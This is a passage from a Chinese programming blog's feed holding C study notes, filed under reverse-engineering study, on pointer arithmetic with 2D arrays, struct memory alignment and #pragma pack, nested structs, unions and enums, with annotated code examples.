punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//19ff10</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\r\n"</span><span class="token punctuation">,</span>ary<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//19ff00</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\r\n"</span><span class="token punctuation">,</span>ary<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//1</span>        <span class="token comment">// ary是int[4]类型的指针常量</span>    <span class="token comment">// ary + 1 ==  (int)ary + sizeof(int[4]) * 1</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\r\n"</span><span class="token punctuation">,</span>ary <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//19ff10</span>        <span class="token comment">// *ary是int类型的指针常量</span>    <span class="token comment">// *ary + 1 == (int)*ary + sizeof(int) * 1</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\r\n"</span><span class="token punctuation">,</span><span class="token operator">*</span>ary <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//04</span>        <span class="token comment">// &amp;ary取地址得到int[3][4]类型的指针</span>    <span class="token comment">// &amp;ary + 1 == (int)ary + sizeof(int[3][4]) * 1</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\r\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>ary <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//30</span>        <span class="token comment">// 二维数组的元素是一维数组</span>    <span class="token comment">// ary[0] 是int[4]数组</span>    <span class="token comment">// 数组名是第0个元素的指针常量</span>    <span class="token comment">// ary[0]是int类型的指针常量</span>    <span class="token comment">// ary[0] + 1 == (int)ary + sizeof(int) * 1</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\r\n"</span><span class="token punctuation">,</span>ary<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//04</span>        <span class="token comment">// 指针加整型得到同类型的指针常量</span>    <span class="token comment">// ary是int[4]类型的指针常量</span>    <span class="token comment">// ary  + 1 得到int[4]类型的指针常量</span>    <span class="token comment">// *(ary + 1)是int类型的指针常量</span>    <span class="token comment">// 数组名是第 0个元素的指针常量</span>    <span class="token comment">// 对int* 做[1]运算得到int</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\r\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>ary <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 14</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CR逆向学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>结构体内存对齐笔记</title>
      <link href="posts/40072.html"/>
      <url>posts/40072.html</url>
      
        <content type="html"><![CDATA[<h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><blockquote><p>结构体是由一批数据组合而成的一种新的数据类型。组成结构型数据的每个数据称为结构型数据的成员。</p></blockquote><p>结构体类型定义的一般形式：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> 结构体名<span class="token punctuation">{</span>    type1 menberName1<span class="token punctuation">;</span>    type2 menberName2<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tips:小写<code>bool</code>一字节，大写<code>BOOL</code>四字节<br><code>*</code> <code>[]</code> <code>-&gt;</code> 这三个具有间接访问功能</p><h4 id="结构体基本语法"><a href="#结构体基本语法" class="headerlink" title="结构体基本语法"></a>结构体基本语法</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token comment">/*学生结构体*/</span><span class="token keyword">struct</span> <span class="token class-name">tagStudent</span><span class="token punctuation">{</span><span class="token keyword">char</span> szName<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// +0</span><span class="token keyword">int</span> nAge<span class="token punctuation">;</span>          <span class="token comment">// +8</span>    <span class="token keyword">double</span>  dbWeight<span class="token punctuation">;</span>  <span class="token comment">//+16</span><span class="token keyword">char</span> nGender<span class="token punctuation">;</span>      <span class="token comment">//+24</span>    <span class="token keyword">float</span>  fHeight<span class="token punctuation">;</span>    <span class="token comment">//+28</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> wID<span class="token punctuation">;</span>   <span class="token comment">//+32</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">struct</span> <span class="token class-name">tagStudent</span> stu <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment">//类型描述</span><span class="token string">"Jack"</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">185.0f</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">9527</span><span class="token punctuation">,</span>true<span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">tagStudent</span><span class="token operator">*</span> pStu <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>pStu <span class="token operator">=</span> <span class="token operator">&amp;</span>stu<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%f\r\n"</span><span class="token punctuation">,</span> stu<span class="token punctuation">.</span>dbWeight<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\r\n"</span><span class="token punctuation">,</span> pStu<span class="token operator">-&gt;</span>nAge<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译选项<code>/ZP1 (2 4 8 16)</code> 1 Byte  2 Byte4 Byte 8 Byte 16 Byte</p><h2 id="结构体内存对齐"><a href="#结构体内存对齐" class="headerlink" title="结构体内存对齐"></a><strong>结构体内存对齐</strong></h2><ul><li>设编译对齐值为Zp</li><li>设结构体成员的地址和结构体首地址之差为offset</li><li>设结构体成员类型为 member type</li><li>必须满足：<br><code>offset % min(Zp,sizeof(member type)) == 0</code></li></ul><p>定义结构体自身的对齐值为 <code>StructAlig</code><br><code>StructAlig = max(sizeof(menber1 type), sizeof(menber2 type),.......,sizeof(menberEnd type))</code></p><p>设整个结构体的空间长度为<code>size</code><br><code>size %  min(Zp,StructAlig) == 0</code></p><p>tips:网络通信中最简单的 对齐设为1<br>/Zp8</p><p><strong>定义某部分对齐</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span>push<span class="token punctuation">)</span> </span><span class="token comment">//保存当前对齐值（编译选项ZP），压栈</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token keyword">struct</span> <span class="token class-name">tagDOB</span><span class="token punctuation">{</span><span class="token keyword">int</span> nYear<span class="token punctuation">;</span><span class="token keyword">char</span> cMonth<span class="token punctuation">;</span>    <span class="token keyword">char</span> wDay<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//structAlig = 4 , sizeof(dob) = 8</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span>pop<span class="token punctuation">)</span> </span><span class="token comment">//出栈</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span>push<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span></span></span><span class="token keyword">struct</span> <span class="token class-name">tagStudent</span><span class="token punctuation">{</span><span class="token keyword">char</span> szName<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//</span>    <span class="token keyword">double</span>  dbWeight<span class="token punctuation">;</span>  <span class="token comment">//+</span>    <span class="token keyword">struct</span> <span class="token class-name">tagDOB</span> dob<span class="token punctuation">;</span>  <span class="token comment">//算这里的对齐值  是他自身的structAlig = 4 , sizeof(dob) = 8</span><span class="token keyword">char</span> nGender<span class="token punctuation">;</span>      <span class="token comment">//+</span>    <span class="token keyword">float</span>  fHeight<span class="token punctuation">;</span>    <span class="token comment">//+</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> wID<span class="token punctuation">;</span>   <span class="token comment">//+</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="某结构体的寻址方式"><a href="#某结构体的寻址方式" class="headerlink" title="某结构体的寻址方式"></a>某结构体的寻址方式</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span>  <span class="token class-name">tagType</span> obj<span class="token punctuation">;</span>obj<span class="token punctuation">.</span>member 的地址是：<span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>obj <span class="token operator">+</span> member offsetobj member <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>member type <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>obj <span class="token operator">+</span> member offset<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="获得结构体成员地址偏移量"><a href="#获得结构体成员地址偏移量" class="headerlink" title="获得结构体成员地址偏移量"></a>获得结构体成员地址偏移量</h4><p><code>#define GetOffset(s,m) (size_t)&amp;(((s*)NULL)-&gt;m)</code></p><hr><hr><h4 id="私有化结构体"><a href="#私有化结构体" class="headerlink" title="私有化结构体"></a>私有化结构体</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">tagStudent</span><span class="token punctuation">{</span><span class="token keyword">char</span> szName<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">double</span>  dbWeight<span class="token punctuation">;</span>      <span class="token keyword">struct</span> <span class="token class-name">tagDOB</span><span class="token punctuation">{</span><span class="token keyword">int</span> nYear<span class="token punctuation">;</span><span class="token keyword">char</span> cMonth<span class="token punctuation">;</span>    <span class="token keyword">char</span> wDay<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>                                         <span class="token comment">//算这里的对齐值  是他自身的structAlig = 4 , sizeof(dob) = 8</span><span class="token keyword">char</span> nGender<span class="token punctuation">;</span>          <span class="token keyword">float</span>  fHeight<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> wID<span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//空结构体大小一字节</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>私有（嵌套）结构体的赋值:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">tagStudent</span><span class="token operator">::</span>tagDOB dob <span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">1999</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="私有匿名的结构体"><a href="#私有匿名的结构体" class="headerlink" title="私有匿名的结构体"></a>私有匿名的结构体</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">tagMath</span><span class="token punctuation">{</span>   <span class="token comment">/* struct */</span> tagBigNumber<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">tagPoint</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>嵌套结构体定义结构体变量：<br><code>struct tagMath::tagPoint point;</code><br>结构体中匿名结构体复制：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">tagMath</span> math <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结构体定义时可以嵌套定义指向它自身的结构体指针，但是不能嵌套定义它自身</p><p>结构体可以整体复制：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">tagStudent</span> stu1<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">tagStudent</span> stu2 <span class="token operator">=</span> stu1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>原理；<br><code>memcpy(&amp;stu2,&amp;stu1,sizeof(stu1));</code><br>浅拷贝（复制指针）、深拷贝，开辟新空间复制内容</p><blockquote><p>问题<br>定义一种类型stu可以放学生的姓名、学号、英语成绩，其中有的老师按照“A”、“B”、“C”、“D”、“F”五个等级<br>给的，有的老师安按照百分制给的成绩，要求该类型可以如是反应学生的情况</p></blockquote><p>以下代码编译会使用名称粉碎</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TYPE_CHAR</span> <span class="token expression"><span class="token number">0</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TYPE_FLOAT</span> <span class="token expression"><span class="token number">1</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TYPE_TEXT</span> <span class="token expression"><span class="token number">2</span></span></span><span class="token keyword">struct</span> <span class="token class-name">tagScore</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> nType<span class="token punctuation">;</span>        <span class="token keyword">char</span> chLevel<span class="token punctuation">;</span>    <span class="token keyword">float</span> fPoint<span class="token punctuation">;</span>    <span class="token keyword">char</span> szText<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">SetScore</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tagScore</span> <span class="token operator">*</span>pScore<span class="token punctuation">,</span><span class="token keyword">char</span> chLevel<span class="token punctuation">)</span><span class="token punctuation">{</span>    pScore<span class="token operator">-&gt;</span>nType <span class="token operator">=</span> TYPE_CHAR<span class="token punctuation">;</span>    pScore<span class="token operator">-&gt;</span>chLevel <span class="token operator">=</span> chLevel<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">SetScore</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tagScore</span> <span class="token operator">*</span>pScore<span class="token punctuation">,</span><span class="token keyword">float</span> fPoint<span class="token punctuation">)</span><span class="token punctuation">{</span>    pScore<span class="token operator">-&gt;</span>nType <span class="token operator">=</span> TYPE_FLOAT<span class="token punctuation">;</span>    pScore<span class="token operator">-&gt;</span>fPoint <span class="token operator">=</span> fPoint<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">SetScore</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tagScore</span> <span class="token operator">*</span>pScore<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>szText<span class="token punctuation">)</span><span class="token punctuation">{</span>    pScore<span class="token operator">-&gt;</span>nType <span class="token operator">=</span> TYPE_TEXT<span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>pScore<span class="token operator">-&gt;</span>szText<span class="token punctuation">,</span>szText<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">ShowScore</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tagScore</span> <span class="token operator">*</span>pScore<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">switch</span><span class="token punctuation">(</span>pScore<span class="token operator">-&gt;</span>nType<span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token keyword">case</span> TYPE_CHAR<span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c\r\n"</span><span class="token punctuation">,</span>pScore<span class="token operator">-&gt;</span>chLevel <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> TYPE_FLOAT<span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%4.1f\r\n"</span><span class="token punctuation">,</span>pScore<span class="token operator">-&gt;</span>fPoint <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> TYPE_TEXT<span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\r\n"</span><span class="token punctuation">,</span>pScore<span class="token operator">-&gt;</span>szText <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ERROR\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    tagScore sc1<span class="token punctuation">;</span>    <span class="token function">SetScore</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sc1<span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ShowScore</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sc1<span class="token punctuation">)</span><span class="token punctuation">;</span>        tagScore sc2<span class="token punctuation">;</span>    <span class="token function">SetScore</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sc2<span class="token punctuation">,</span><span class="token number">56.9f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ShowScore</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sc2<span class="token punctuation">)</span><span class="token punctuation">;</span>        tagScore sc3<span class="token punctuation">;</span>    <span class="token function">SetScore</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sc3<span class="token punctuation">,</span><span class="token string">"good"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ShowScore</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sc3<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>缺点:浪费内存空间，详情见下图：</p><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/1.png" alt="结构体内存图1"></p><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210719205245.png" alt="结构体内存图2"></p><h3 id="共用体"><a href="#共用体" class="headerlink" title="共用体"></a>共用体</h3><p>语法糖</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">union</span> unScore<span class="token punctuation">{</span>    <span class="token keyword">char</span> chLevel<span class="token punctuation">;</span>    <span class="token keyword">float</span> fPoint<span class="token punctuation">;</span>    <span class="token keyword">char</span> szText<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>共用体，所有成员占用同一空间，按最大的成员为共用体分配内存大小，同一空间写入成员类型不同，内容解释不就不同</p><p>以下代码是改进上述题目使用结构体的该进：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">tagScore</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> nType<span class="token punctuation">;</span><span class="token keyword">union</span> unScore <span class="token punctuation">{</span><span class="token keyword">char</span> chLevel<span class="token punctuation">;</span>    <span class="token keyword">float</span> fPoint<span class="token punctuation">;</span>    <span class="token keyword">char</span> szText<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>Score<span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">SetScore</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tagScore</span> <span class="token operator">*</span>pScore<span class="token punctuation">,</span><span class="token keyword">char</span> chLevel<span class="token punctuation">)</span><span class="token punctuation">{</span>pScore<span class="token operator">-&gt;</span>Score<span class="token punctuation">.</span>chLevel <span class="token operator">=</span> chLevel<span class="token punctuation">;</span>    pScore<span class="token operator">-&gt;</span>nType <span class="token operator">=</span> TYPE_CHAR<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">SetScore</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tagScore</span> <span class="token operator">*</span>pScore<span class="token punctuation">,</span><span class="token keyword">float</span> fPoint<span class="token punctuation">)</span><span class="token punctuation">{</span>pScore<span class="token operator">-&gt;</span>Score<span class="token punctuation">.</span>fPoint <span class="token operator">=</span> fPoint<span class="token punctuation">;</span>    pScore<span class="token operator">-&gt;</span>nType <span class="token operator">=</span> TYPE_FLOAT<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">SetScore</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tagScore</span> <span class="token operator">*</span>pScore<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>szText<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">strcpy</span><span class="token punctuation">(</span>pScore<span class="token operator">-&gt;</span>Score<span class="token punctuation">.</span>szText<span class="token punctuation">,</span>szText<span class="token punctuation">)</span><span class="token punctuation">;</span>    pScore<span class="token operator">-&gt;</span>nType <span class="token operator">=</span> TYPE_TEXT<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">ShowScore</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tagScore</span> <span class="token operator">*</span>pScore<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">switch</span><span class="token punctuation">(</span>pScore<span class="token operator">-&gt;</span>nType<span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token keyword">case</span> TYPE_CHAR<span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c\r\n"</span><span class="token punctuation">,</span>pScore<span class="token operator">-&gt;</span>Score<span class="token punctuation">.</span>chLevel<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> TYPE_FLOAT<span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%4.1f\r\n"</span><span class="token punctuation">,</span>pScore<span class="token operator">-&gt;</span>Score<span class="token punctuation">.</span>fPoint <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> TYPE_TEXT<span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\r\n"</span><span class="token punctuation">,</span>pScore<span class="token operator">-&gt;</span>Score<span class="token punctuation">.</span>szText <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ERROR\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>类似于宏，受作用域限制的宏</p><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210719230915.png"><br><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210719231003.png"><br><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210719231040.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">enum</span> <span class="token class-name">eType</span><span class="token punctuation">{</span> TYPE_CHAR<span class="token punctuation">,</span> TYPE_FLOAT<span class="token punctuation">,</span> TYPE_TEXT<span class="token punctuation">,</span> <span class="token comment">//这些叫做枚举常量，编译自动保持其唯一性</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">enum</span> <span class="token class-name">eType</span> test <span 